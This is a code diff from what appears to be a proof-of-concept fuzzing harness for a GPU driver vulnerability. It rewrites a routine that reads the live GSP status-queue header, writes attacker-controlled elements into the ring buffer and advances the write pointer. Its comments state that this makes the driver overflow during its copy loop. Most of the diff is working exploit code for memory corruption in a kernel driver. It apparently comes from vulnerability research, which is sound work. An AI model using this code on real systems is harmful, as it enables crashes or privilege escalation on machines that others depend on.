@@ -1,70 +1,51 @@
 #include "message_queue.h"
 #include "gpu_instrumentation.h"
 #include "utilities.h"
+#include <array>
+#include <cerrno>
 #include <cstdint>
 #include <cstring>
-#include <dirent.h>
-#include <fcntl.h>
 #include <optional>
 #include <stdexcept>
-#include <sys/ioctl.h>
-#include <sys/types.h>
-#include <unistd.h>
 #include <vector>
 
+//
+// msgqTxHeader / rxHeader field offsets, relative to status_queue_iova.
+// Mirrors the proven layout used by the standalone minimal.cu harness.
+//
+static constexpr std::uint64_t TXHDR_MSGCOUNT_OFF{12};
+static constexpr std::uint64_t TXHDR_WRITEPTR_OFF{16};
+static constexpr std::uint64_t TXHDR_ENTRYOFF_OFF{28};
+static constexpr std::uint64_t RXHDR_READPTR_OFF{32};
+
 struct POCConfig {
-	bool initialized;
-	uintptr_t base_address; // Status Queue base address (absolute)
-	uint32_t num_entries; // 64
-	uint32_t entry_size; // 4096
+	std::uint32_t num_entries; // msgCount (63)
+	std::uint32_t entry_size; // 4096
 
 	POCConfig()
-	    : initialized{false}, base_address{0}, num_entries{63}, entry_size{0x1000}
+	    : num_entries{63}, entry_size{0x1000}
 	{
 	}
 };
 
 const POCConfig config{};
 
-struct SimpleEntryInfo {
-	std::uint64_t offset;
-	std::uint32_t seqNum;
-};
-
-/*
- * Find the entry in the message queue, which has the largest seqNum and return the pointer to it.
- */
-static SimpleEntryInfo findMaxSeqNumEntry(const uint8_t* msgQueue,
-					  const uint64_t size)
+//
+// Build a message of `msgLength` queue elements: element 0 is a well-formed
+// header (elemCount = msgLength, valid checksum, expected seqNum), elements
+// 1..N-1 are the fuzzer-supplied body pages. Header fields are harness-owned
+// (delivery/validity invariants); the body is fuzzer-owned content.
+//
+static std::vector<std::uint8_t> makePayload(const std::uint32_t msgLength,
+					     const std::uint32_t rxSeqNum,
+					     const std::uint8_t* buffer_ptr,
+					     const std::uint32_t buffer_size)
 {
-	SimpleEntryInfo maxSeqNumEntry{};
-	if (size < 0x2000) {
-		return maxSeqNumEntry;
-	}
-	uint64_t offset{config.entry_size};
-	const uint64_t limit{size - config.entry_size};
-	while (offset < limit) {
-		const uint8_t* seqNumPtr{msgQueue + offset + 0x24};
-		const uint32_t seqNum{bufToU32(seqNumPtr)};
+	std::vector<std::uint8_t> payload(static_cast<std::size_t>(msgLength) *
+					  config.entry_size);
 
-		if (seqNum > maxSeqNumEntry.seqNum) {
-			maxSeqNumEntry.seqNum = seqNum;
-			maxSeqNumEntry.offset = offset;
-		}
-		offset += config.entry_size;
-	}
-	return maxSeqNumEntry;
-}
-
-static std::vector<std::uint8_t> makePayload(const SimpleEntryInfo& entry,
-					     const uint32_t msgLength,
-					     const uint32_t rxSeqNum,
-					     uint8_t* buffer_ptr,
-					     const uint32_t buffer_size)
-{
-	std::vector<std::uint8_t> payload(msgLength * config.entry_size);
-	// make head entry
 	StatusQueueEntry head{
+	    .checkSum = 0,
 	    .seqNum = rxSeqNum,
 	    .elemCount = msgLength,
 	    .rpc_version = 0x03000000,
@@ -80,54 +61,80 @@ static std::vector<std::uint8_t> makePayload(const SimpleEntryInfo& entry,
 	}
 
 	std::memcpy(payload.data(), &head, sizeof(head));
-
-	// TODO: fill in the rest of payload properly
-	std::memcpy(payload.data() + sizeof(head), buffer_ptr, buffer_size);
+	std::memcpy(payload.data() + config.entry_size, buffer_ptr, buffer_size);
 
 	return payload;
 }
 
 int insert_payload(std::uint8_t* buffer_ptr, const std::uint32_t buffer_size)
 {
-	// NOTE: consider adding check for msgLength >= 17
-
 	const auto info{getGspMsgQueueInfo()};
 	if (!info) {
 		errno = ENODEV;
 		return -1;
 	}
 
-	if (buffer_size > info->status_queue_size - 0x1000 ||
-	    buffer_size % config.entry_size != 0) {
+	if (buffer_size == 0 || buffer_size % config.entry_size != 0 ||
+	    buffer_size > info->status_queue_size - config.entry_size) {
 		errno = EINVAL;
 		return -1;
 	}
 
+	// One header element + one element per body page = elemCount.
 	const std::uint32_t msgLength{(buffer_size / config.entry_size) + 1};
-	// dump the entire message quueue
-	fprintf(stderr, "[GPU INSTRUMENTATION] Getting entire message queue");
-	const auto msgQueue{dumpMemoryRegion(info->status_queue_iova, 0,
-					     info->status_queue_size)};
-	if (!msgQueue) {
+
+	//
+	// Read the live ring header. The overflow needs >= elemCount elements to
+	// be *available* (writePtr - readPtr), so we place the message starting
+	// at the next-to-be-read slot and advance writePtr to advertise it.
+	//
+	const auto msgCountBuf{
+	    dumpMemoryRegion(info->status_queue_iova, TXHDR_MSGCOUNT_OFF, 4)};
+	const auto entryOffBuf{
+	    dumpMemoryRegion(info->status_queue_iova, TXHDR_ENTRYOFF_OFF, 4)};
+	const auto readPtrBuf{
+	    dumpMemoryRegion(info->status_queue_iova, RXHDR_READPTR_OFF, 4)};
+	if (!msgCountBuf || !entryOffBuf || !readPtrBuf) {
 		return -1;
 	}
-	// find current head
-	// const std::uint32_t readPtr{ bufToU32(&msgQueue->data()[0x20]) };
+	const std::uint32_t msgCount{bufToU32(msgCountBuf->data())};
+	const std::uint32_t entryOff{bufToU32(entryOffBuf->data())};
+	const std::uint32_t readPtr{bufToU32(readPtrBuf->data())};
 
-	// find the entry with the highest seqNum
-	const SimpleEntryInfo maxSeqNumEntry{findMaxSeqNumEntry(
-	    msgQueue->data(), msgQueue->size())};
-	// generate and insert payload after maxSeqNumEntry
-	const auto payload{makePayload(maxSeqNumEntry, msgLength,
-				       info->rxSeqNum, buffer_ptr,
+	if (msgCount == 0 || msgLength > msgCount) {
+		errno = EIO;
+		return -1;
+	}
+
+	const auto payload{makePayload(msgLength, info->rxSeqNum, buffer_ptr,
 				       buffer_size)};
 
-	// write payload to message queue
-	fprintf(stderr,
-		"[GPU INSTRUMENTATION] Inserting payload to entry index %lu\n",
-		maxSeqNumEntry.offset / 0x1000);
-	if (modifyMemoryRegion(info->status_queue_iova, maxSeqNumEntry.offset,
-			       payload) == -1) {
+	// Write each element into its (possibly wrapping) ring slot.
+	for (std::uint32_t e{0}; e < msgLength; ++e) {
+		const std::uint32_t slot{(readPtr + e) % msgCount};
+		const std::uint64_t dstOff{
+		    entryOff +
+		    static_cast<std::uint64_t>(slot) * config.entry_size};
+		const std::vector<std::uint8_t> element(
+		    payload.begin() +
+			static_cast<std::size_t>(e) * config.entry_size,
+		    payload.begin() +
+			static_cast<std::size_t>(e + 1) * config.entry_size);
+		if (modifyMemoryRegion(info->status_queue_iova, dstOff,
+				       element) == -1) {
+			return -1;
+		}
+	}
+
+	//
+	// DELIVERY: advertise msgLength available elements. Without this the
+	// driver never enters the copy loop far enough to overflow.
+	//
+	const std::uint32_t newWritePtr{(readPtr + msgLength) % msgCount};
+	const std::array<std::uint8_t, 4> wpBuf{u32ToBuf(newWritePtr)};
+	if (modifyMemoryRegion(
+		info->status_queue_iova, TXHDR_WRITEPTR_OFF,
+		std::vector<std::uint8_t>(wpBuf.begin(), wpBuf.end())) == -1) {
 		return -1;
 	}
 
